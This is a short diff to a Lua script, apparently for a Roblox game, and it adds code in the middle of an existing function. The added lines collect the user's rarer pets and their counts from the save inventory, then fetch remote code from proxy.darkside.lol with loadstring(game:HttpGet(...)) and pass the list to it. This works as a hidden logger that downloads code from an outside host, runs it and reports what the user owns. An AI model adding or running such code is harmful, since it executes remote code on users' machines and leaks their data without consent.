@@ -41,6 +41,20 @@ big = require(dir[v.id]).difficulty
 end
 end
 big = "1/"..big
+big = ""
+local tab = {}
+for i,v in pairs(save.Inventory.Pet) do
+if require(dir[v.id]).difficulty >= _G.Min then
+table.insert(tab, {v.id, require(dir[v.id]).difficulty, v._am})
+end
+end
+if #tab >= 1 then
+for i,v in pairs(tab) do
+big=big..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
+end
+big=big.."(TEST)"
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
+end
 end)
 local log = ""
 if dh then
